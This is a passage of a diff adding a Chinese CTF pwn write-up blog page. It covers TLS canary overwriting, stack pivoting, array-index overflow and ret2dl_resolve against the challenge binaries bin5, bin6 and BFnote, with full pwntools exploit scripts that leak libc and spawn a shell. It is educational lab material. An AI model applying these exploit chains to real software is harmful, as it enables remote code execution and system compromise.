p.send(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recv(timeout = <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>爆破是常规操作，不爆破也是行的，如图：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-801b7fbe5f2d8b40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>因为在read后其实前面的字节是一样的，所以只需要覆盖最后一个字节为\x3E即可：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-38660ef8e686a23c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>最后检验下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-1f0713967bd65fa3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>总结：这里就是利用了read函数后面有printf或者puts函数可以打印，通过覆盖低位\x0a，达到泄露低地址的目的，学习到了新技能。</p>
+<h3 id="题目6-bin5"><a href="#题目6-bin5" class="headerlink" title="题目6:bin5"></a>题目6:bin5</h3><p>babystack</p>
+<h4 id="开始分析：-5"><a href="#开始分析：-5" class="headerlink" title="开始分析："></a>开始分析：</h4><p><img src="https://upload-images.jianshu.io/upload_images/9085575-6bfdb90bdc8395e6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-0f6ddfc3a7b250cb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-6329f19f99f21cc0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>分析逻辑可知，是创建了进程，关键逻辑在start_routine函数那里，这里知道是s的大小是0x1010，而我们的输入可以达到0x10000，很明显想到栈溢出，但是有canary保护，而且是线程，所以我们这里学习一种新招式，TSL（线程局部存储）攻击，基本思路就是我们得覆盖很多个a到高地址，直到把TLS给覆盖从而修改了canary的值为a，绕过了canary后就可以栈溢出操作了。</p>
+<p>TLS中存储的canary在fs：0x28处，我们能覆盖到这里就好啦~当然我们不知道具体在哪里，所以只能爆破下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-a9e93681547f0d08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这是爆破canary位置的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process(<span class="string">'./bs'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"How many bytes do you want to send?"</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    payload += <span class="string">'a'</span>*<span class="number">0x1010</span></span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    payload += p64(main_addr)</span><br><span class="line">    payload += <span class="string">'a'</span>*(offset-len(payload))</span><br><span class="line">    p.send(payload)</span><br><span class="line">    temp = p.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> temp:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset += <span class="number">1</span></span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
+
+<p>它会卡在offset为6128那里：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-d42a4e37363d4858.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>说明我们成功覆盖了canary，偏移量为6128。接下来就好办啦<del>利用栈迁移的操作+one_gadget直接getshell</del></p>
+<h4 id="大体思路：-1"><a href="#大体思路：-1" class="headerlink" title="大体思路："></a>大体思路：</h4><p>1、通过padding爆破填充a修改TLS中的canary为aaaaaaaa，从而绕过栈溢出保护（这里必须是线程的题目，而且输入足够大才行！）</p>
+<p>2、泄露出puts的got地址得到真实的基地址，用于getshell</p>
+<p>3、利用栈迁移(需要有read函数和leave；ret的ROP可以用)，在bss段中开辟一个空间来写one_gadget来payload~</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-29d3cd42c1becb03.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./bs'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bs'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">main_addr = <span class="number">0x4009E7</span></span><br><span class="line">offset = <span class="number">6128</span></span><br><span class="line">bss_start = elf.bss()</span><br><span class="line">fakebuf = bss_start + <span class="number">0x300</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c03</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400c01</span></span><br><span class="line">leave_ret = <span class="number">0x400955</span></span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_libc = libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">read_plt = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"How many bytes do you want to send?"</span>)</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x1010</span> </span><br><span class="line">payload += p64(fakebuf)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret)</span><br><span class="line">payload += p64(fakebuf)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload += <span class="string">'a'</span>*(offset - len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"It's time to say goodbye.\n"</span>)</span><br><span class="line">puts_addr = u64(p.recv()[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">getshell_libc = <span class="number">0xf02a4</span></span><br><span class="line">base_addr = puts_addr - puts_libc</span><br><span class="line">one_gadget = base_addr + getshell_libc</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-ef7855fdda0925c6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png">这是我们的payload在栈中的分布图，可以知道puts的真实地址是6位的，所以才要补齐两个\0，最后验证下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-b81c25cbc387ce27.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>其实这里不用栈迁移也一样做的（栈迁移是大佬写的，下面是自己复现时做出来的）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./bs'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bs'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">main_addr = <span class="number">0x4009E7</span></span><br><span class="line">fgets_addr = <span class="number">0x400957</span></span><br><span class="line">offset = <span class="number">6128</span></span><br><span class="line">bss_start = elf.bss()</span><br><span class="line">fakebuf = bss_start + <span class="number">0x300</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c03</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400c01</span></span><br><span class="line">leave_ret = <span class="number">0x400955</span></span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_libc = libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">read_plt = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"How many bytes do you want to send?"</span>)</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x1010</span> </span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(fgets_addr)</span><br><span class="line">payload += <span class="string">'a'</span>*(offset - len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"It's time to say goodbye.\n"</span>)</span><br><span class="line">puts_addr = u64(p.recv()[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">getshell_libc = <span class="number">0xf02a4</span></span><br><span class="line">base_addr = puts_addr - puts_libc</span><br><span class="line">one_gadget = base_addr + getshell_libc</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x1010</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>检验下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-ce6e17707cf5d406.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h5 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h5><p>针对于这种多线程的题目，修改TLS的canary，绕过canary，又增长了新姿势，这里提一下栈迁移，在有read函数的情况下，可以利用栈迁移的思想，到bss段是常有的事，一般是bss+0x300的位置开始写。如果read后面有puts函数或者printf函数，就可以泄露出ebp的值，从而确定栈顶指针，从而写到栈中，然后ebp写esp的地址，leave就会跳到esp去执行我们写入的东西。</p>
+<h3 id="题目7-bin6"><a href="#题目7-bin6" class="headerlink" title="题目7 bin6"></a>题目7 bin6</h3><p>一波检查和分析</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-9f8854290274cf4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-dc37269704d12683.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-b71c4ff8d94632c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-fdc1ad6c6d17f905.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-e7d778f837f4c792.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>开了栈溢出保护和堆栈不可执行，看main，这里name是到bss段的，最后saybye的时候打印出来，重点看中间的程序，发现有数组，这里一开始不明感没做过这种题目，一直在想怎么泄露canary然后栈溢出去覆盖，最后ret到system，但是一直木有，师傅提示这是个新姿势，数组！数组下标溢出~学习一波先呗：</p>
+<p>C/C++不对数组做边界检查。 可以重写数组的每一端，并写入一些其他变量的<br>数组或者甚至是写入程序的代码。不检查下标是否越界可以有效提高程序运行<br>的效率，因为如果你检查，那么编译器必须在生成的目标代码中加入额外的代<br>码用于程序运行时检测下标是否越界，这就会导致程序的运行速度下降，所以<br>为了程序的运行效率，C / C++才不检查下标是否越界。发现如果数组下标越<br>界了，那么它会自动接着那块内存往后写。</p>
+<p>漏洞利用：继续往后写内存，这里就可以通过计算，写到我们的ret位置处，这样就可以直接getshell啦~</p>
+<p>再回来这题的栈，</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-593d602cfeaf532c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这里中间间隔了60，也就是15条4字节的指令，下标从0开始，那么ret的下标就是14，这样就轻松地绕过了cananry，同时这题里面有现成的system函数（0x080485FB），那么payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./homework'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./homework'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'hackme.inndy.tw'</span>,<span class="number">7701</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,a)</span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What's your name? "</span>)</span><br><span class="line">p.sendline(<span class="string">"Your father"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"4 &gt; dump all numbers"</span>)</span><br><span class="line">p.recvuntil(<span class="string">" &gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index to edit: "</span>)</span><br><span class="line">p.sendline(<span class="string">"14"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"How many? "</span>)</span><br><span class="line">system_addr = <span class="number">0x080485FB</span></span><br><span class="line">p.sendline(str(system_addr))</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="题目8"><a href="#题目8" class="headerlink" title="题目8"></a>题目8</h3><p>这题是新春战疫情的一道题，涉及到tls的知识。</p>
+<p><img src="/blog_img/image-20200528164511275.png" alt="image-20200528164511275"></p>
+<p><img src="/blog_img/image-20200528164750764.png" alt="image-20200528164750764"></p>
+<p>这里逻辑不复杂，一个栈溢出操作，但是呢，开了栈溢出保护，这里需要考察的就是一个知识点，canary不只存在stack中或者多线程时，在stack很远的位置处，canary还存在于0x7f开头的mmap地址处，所以我们需要做的就是先在栈溢出时部署好rop链子，然后在堆申请时，申请足够大，申请出canary并覆盖掉，这样就完事了～</p>
+<p>这里直接使用dl_runtime_resolve的方法去做即可。</p>
+<h4 id="这里讲解下知识点："><a href="#这里讲解下知识点：" class="headerlink" title="这里讲解下知识点："></a>这里讲解下知识点：</h4><p>对于这个canary的绕过，需要用到TLS，不过需要用到malloc(size)，size需要很大，用mmap申请出堆。</p>
+<p>canary 这个值是怎么来的呢，在linux 下，有一种线程局部存储(Thread Local Storage)机制，简称为TLS。它主要存储着一个线程的一些局部变量，它的结构体如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the  </span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span>  </span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;  </span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span>  </span><br><span class="line">  <span class="keyword">int</span> multiple_threads;  </span><br><span class="line">  <span class="keyword">int</span> gscope_flag;  </span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;  </span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="keyword">uintptr_t</span> pointer_guard;  </span><br><span class="line">  ...  </span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>
+
+<p>而gs寄存器就指向这个结构体，结构体里的stack_guard值就是canary 的值，所以只要能篡改结构体里stack_guard的值就可以绕过canary了。</p>
+<p>这里记住查看canary位置的方法为：search -t dword  (canary值)  ，这个就是gs所在的位置</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, large gs:<span class="number">14</span>h</span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/image-20200528212625472.png" alt="image-20200528212625472"></p>
+<p>paylaod如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from roputils import *</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">p = process(<span class="string">'./BFnote'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./BFnote'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">sda = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line">bss_stage1 = elf.bss() + <span class="number">0x300</span></span><br><span class="line">bss_stage2 = <span class="number">80</span> + bss_stage1</span><br><span class="line"></span><br><span class="line">ppp = <span class="number">0x080489d9</span></span><br><span class="line">pop_ebp = <span class="number">0x080489db</span></span><br><span class="line">leave_ret = <span class="number">0x08048578</span></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x3a</span> + p32(<span class="number">0x804A064</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,"b *0x8048965")</span></span><br><span class="line">sda(<span class="string">"description :"</span>,pay)</span><br><span class="line"></span><br><span class="line">buf = p32(elf.plt[<span class="string">'read'</span>]) + p32(ppp)</span><br><span class="line">buf += p32(<span class="number">0</span>) + p32(bss_stage1) + p32(<span class="number">100</span>)</span><br><span class="line">buf += p32(pop_ebp) + p32(bss_stage1)</span><br><span class="line">buf += p32(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">"postscript :"</span>,buf)</span><br><span class="line">sla(<span class="string">"size :"</span>,str(<span class="number">0x20000</span>))</span><br><span class="line">sla(<span class="string">"size :"</span>,str(<span class="number">0x216fc</span>))</span><br><span class="line">sla(<span class="string">"re-enter :\n"</span>,str(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">sda(<span class="string">"title :"</span>,<span class="string">'a'</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sda(<span class="string">"note :"</span>,<span class="string">'a'</span>*<span class="number">4</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x8048450</span></span><br><span class="line">rel_plt = <span class="number">0x80483d0</span> <span class="comment">#elf.get_section_by_name('.rel.plt').header.sh_addr</span></span><br><span class="line">index_offset = (bss_stage1+<span class="number">28</span>) - rel_plt</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">dynsym = <span class="number">0x80481d8</span>   <span class="comment">#objdump -s -j .dynsym bof</span></span><br><span class="line">dynstr = <span class="number">0x80482c8</span>    <span class="comment">#objdump -s -j .dynstr bof</span></span><br><span class="line">fake_sym_addr = bss_stage1+<span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> -((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym&lt;&lt;<span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fack_reloc = p32(read_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr <span class="comment">#加0x10是因为Elf32_Sym的大小为0x10</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line">payload = <span class="string">'aaaa'</span></span><br><span class="line">payload += p32(plt_0)</span><br><span class="line">payload += p32(index_offset)</span><br><span class="line">payload += <span class="string">'aaaa'</span></span><br><span class="line">payload += p32(bss_stage2)</span><br><span class="line">payload += <span class="string">'aaaaaaaa'</span></span><br><span class="line">payload += fack_reloc <span class="comment">#(bss_stage1+28)的位置</span></span><br><span class="line">payload += <span class="string">'b'</span>*align</span><br><span class="line">payload += fake_sym <span class="comment">#(bss_stage1+36)的位置 </span></span><br><span class="line">payload += <span class="string">"system\x00"</span></span><br><span class="line">payload += <span class="string">'a'</span>*(<span class="number">80</span>-len(payload))</span><br><span class="line">payload += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload += <span class="string">'a'</span>*(<span class="number">100</span>-len(payload))</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
